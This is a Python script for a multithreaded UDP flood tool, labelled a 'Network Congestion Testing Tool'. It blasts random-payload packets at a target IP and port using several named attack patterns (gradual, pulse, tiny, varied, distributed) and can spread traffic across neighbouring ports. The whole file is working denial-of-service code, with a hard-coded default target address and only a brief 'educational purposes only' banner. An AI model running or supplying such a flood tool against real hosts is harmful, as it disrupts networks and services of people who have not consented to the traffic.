import socket
import time
import random
import sys
import threading
from datetime import datetime
import struct
import argparse
import os

# Global variables for statistics
packets_sent = 0
bytes_sent = 0
lock = threading.Lock()

def send_packets(target_ip, target_port, packet_size, duration, attack_type="gradual", thread_id=0, multi_target=False):
    """
    Send packets to target continuously for specified duration with various attack patterns.
    """
    global packets_sent, bytes_sent
    
    # Create a new socket for each thread
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    # Set socket options for better reliability
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    # Use an even smaller packet size to avoid triggering errors
    # Different packet sizes for different attack types
    if attack_type == "tiny":
        actual_packet_size = 64  # Very small packets
    elif attack_type == "varied":
        # Will vary dynamically
        actual_packet_size = min(600, packet_size)
    else:
        # For other attack types
        actual_packet_size = min(600, packet_size)
    
    # Create different payload templates to avoid regenerating for every packet
    payload_templates = {}
    sizes = [64, 128, 256, 512, 600]
    for size in sizes:
        try:
            payload_templates[size] = os.urandom(size)  # More random than random.randbytes
        except AttributeError:
            payload_templates[size] = bytes(random.getrandbits(8) for _ in range(size))
    
    # Use the OS urandom for better randomness
    base_payload = payload_templates[min(sizes, key=lambda k: abs(k-actual_packet_size))]
    
    end_time = time.time() + duration
    packet_count = 0
    
    # Parameters for different attack patterns
    if attack_type == "gradual":
        delay = 0.2  # Start with larger delay
        decrease_rate = 0.9995  # Very slow decrease
    elif attack_type == "pulse":
        base_delay = 0.005
    elif attack_type == "slow":
        delay_range = (0.1, 0.5)  # Very slow but consistent
    elif attack_type == "tiny":
        delay_range = (0.0005, 0.002)  # Fast tiny packets
    elif attack_type == "varied":
        delay_range = (0.002, 0.01)
    else:  # random, constant or basic
        delay_range = (0.002, 0.02)
    
    # Target ports - primary port plus nearby ports if multi-target is enabled
    target_ports = [target_port]
    if multi_target:
        for offset in range(1, 4):  # Reduced range to avoid hitting too many ports
            target_ports.append(target_port + offset)
            target_ports.append(target_port - offset)
    
    # Main packet sending loop
    while time.time() < end_time:
        try:
            # Implement different attack patterns
            if attack_type == "gradual":
                # Gradually decrease delay (increase rate)
                delay *= decrease_rate
                delay = max(0.002, delay)  # Increased minimum delay to avoid overwhelming
                time.sleep(delay)
                current_size = actual_packet_size
                
            elif attack_type == "pulse":
                # Create pulse pattern
                cycle_time = 10  # seconds per cycle
                position = (time.time() % cycle_time) / cycle_time
                
                if position < 0.2:  # 20% of time - high intensity
                    time.sleep(0.001)
                    current_size = actual_packet_size
                elif position < 0.6:  # 40% of time - medium intensity
                    time.sleep(0.005)
                    current_size = actual_packet_size
                else:  # 40% of time - low intensity
                    time.sleep(0.02)
                    current_size = actual_packet_size // 2
                    
            elif attack_type == "tiny":
                # Fast tiny packets
                time.sleep(random.uniform(*delay_range))
                current_size = 64  # Tiny packets
                
            elif attack_type == "varied":
                # Vary packet sizes
                time.sleep(random.uniform(*delay_range))
                current_size = random.choice(sizes)
                
            elif attack_type == "slow":
                # Slow but persistent traffic
                time.sleep(random.uniform(*delay_range))
                current_size = actual_packet_size
                
            else:  # Random, constant, or basic
                time.sleep(random.uniform(*delay_range))
                current_size = actual_packet_size
            
            # Generate extremely simple packet - just random data, no structure
            packet_count += 1
            
            # Get the right size payload template
            closest_size = min(sizes, key=lambda k: abs(k-current_size))
            payload = payload_templates[closest_size]
            
            # Select a target port
            current_port = random.choice(target_ports) if multi_target else target_port
            
            # Send packet
            sock.sendto(payload, (target_ip, current_port))
            
            # Update statistics
            with lock:
                packets_sent += 1
                bytes_sent += len(payload)
                
        except Exception:
            # Just ignore errors and continue
            pass
    
    sock.close()

def flood(target_ip, target_port, duration=60, packet_size=600, num_threads=10, 
          attack_type="distributed", multi_target=False):
    """
    Flood a target IP and port with UDP packets using multiple threads and various attack patterns.
    """
    global packets_sent, bytes_sent
    
    packets_sent = 0
    bytes_sent = 0
    start_time = time.time()
    
    print(f"[*] Starting {attack_type} flood on {target_ip}:{target_port} for {duration} seconds")
    print(f"[*] Using {num_threads} threads with packet size ~{packet_size} bytes")
    print(f"[*] Multi-target mode: {'Enabled' if multi_target else 'Disabled'}")
    
    # Create and start threads with different attack patterns
    threads = []
    attack_types = ["gradual", "pulse", "random", "slow", "tiny", "varied", "basic"]
    
    # Cap number of threads to avoid excessive load
    num_threads = min(num_threads, 20)  # Reduced maximum thread count
    
    for i in range(num_threads):
        if attack_type == "distributed":
            # Distribute different attack patterns across threads
            thread_attack = attack_types[i % len(attack_types)]
        else:
            # Use the specified attack type for all threads
            thread_attack = attack_type
            
        thread = threading.Thread(
            target=send_packets,
            args=(target_ip, target_port, packet_size, duration, thread_attack, i, multi_target)
        )
        thread.daemon = True
        threads.append(thread)
        
        # Start threads very gradually to avoid initial spike
        thread.start()
        # Random delay between thread starts - more gradual
        time.sleep(random.uniform(0.5, 1.0))
    
    # Monitor and display progress
    try:
        last_packets = 0
        last_bytes = 0
        last_time = start_time
        
        while time.time() - start_time < duration:
            time.sleep(1)
            current_time = time.time()
            elapsed = current_time - start_time
            current_packets = packets_sent
            current_bytes = bytes_sent
            
            # Calculate rates
            interval = current_time - last_time
            if interval > 0:
                pps = (current_packets - last_packets) / interval
                bps = (current_bytes - last_bytes) * 8 / interval  # bits per second
            else:
                pps = bps = 0
                
            # Convert bps to appropriate unit
            if bps < 1000:
                bps_str = f"{bps:.2f} bps"
            elif bps < 1000000:
                bps_str = f"{bps/1000:.2f} Kbps"
            else:
                bps_str = f"{bps/1000000:.2f} Mbps"
            
            print(f"[+] Progress: {elapsed:.1f}s/{duration}s - {current_packets} packets ({pps:.2f} pkt/s)")
            print(f"    Bandwidth: {bps_str}, Total: {current_bytes/1024/1024:.2f} MB sent")
            
            last_packets = current_packets
            last_bytes = current_bytes
            last_time = current_time
            
    except KeyboardInterrupt:
        print("\n[!] Flooding interrupted by user")
    
    # Wait for all threads to finish
    for thread in threads:
        thread.join(timeout=0.5)
    
    elapsed_time = time.time() - start_time
    mbytes_sent = bytes_sent / (1024 * 1024)
    print(f"\n[*] Flooding completed.")
    print(f"[*] Sent {packets_sent} packets ({mbytes_sent:.2f} MB) in {elapsed_time:.2f} seconds")
    print(f"[*] Average: {packets_sent / elapsed_time if elapsed_time > 0 else 0:.2f} pkt/s, {mbytes_sent*8/elapsed_time:.2f} Mbps")

def main():
    # Create argument parser with safer default values
    parser = argparse.ArgumentParser(description='Network Congestion Testing Tool')
    parser.add_argument('-t', '--target', default="140.118.123.107", help='Target IP address')
    parser.add_argument('-p', '--port', type=int, default=5001, help='Target port')
    parser.add_argument('-d', '--duration', type=int, default=60, help='Test duration in seconds')
    parser.add_argument('-s', '--size', type=int, default=600, help='Packet size in bytes (default: 600)')
    parser.add_argument('-n', '--threads', type=int, default=10, help='Number of threads (default: 10)')
    parser.add_argument('-a', '--attack-type', default="distributed", 
                        choices=["distributed", "gradual", "pulse", "random", "slow", "tiny", "varied", "basic", "help"],
                        help='Traffic pattern to use')
    parser.add_argument('-m', '--multi-target', action='store_true', help='Also send to nearby ports')
    parser.add_argument('--stress-test', action='store_true', help='Run a stress test at lower intensity')
    
    args = parser.parse_args()
    
    if args.attack_type == "help":
        print("Available attack types:")
        print("  distributed - Mix of all attack types across threads (default)")
        print("  gradual     - Gradually increase packet rate")
        print("  pulse       - Send packets in pulses (high/low intensity)")
        print("  random      - Random delays and packet sizes")
        print("  slow        - Slow but persistent traffic")
        print("  tiny        - Small packets at higher frequency")
        print("  varied      - Continuously varying packet sizes")
        print("  basic       - Simple packets with no special formatting")
        print("\nAdditional options:")
        print("  --multi-target    - Send to nearby ports as well")
        print("  --stress-test     - Run a less intense but longer test")
        sys.exit(0)
    
    # Adjust parameters for stress test
    if args.stress_test:
        args.duration = max(args.duration, 120)  # Minimum 2 minutes
        args.threads = min(args.threads, 5)      # Maximum 5 threads
        args.size = min(args.size, 512)          # Maximum 512 bytes
    
    # Start flooding
    flood(args.target, args.port, args.duration, args.size, args.threads, args.attack_type, args.multi_target)

if __name__ == "__main__":
    print("[*] Network Congestion Testing Tool")
    print("[*] For educational purposes only")
    print("[*] This tool demonstrates how network congestion affects performance")
    
    # Check if running with root privileges for better performance
    if os.geteuid() != 0:
        print("[!] Warning: For better performance, consider running with sudo")
    main()
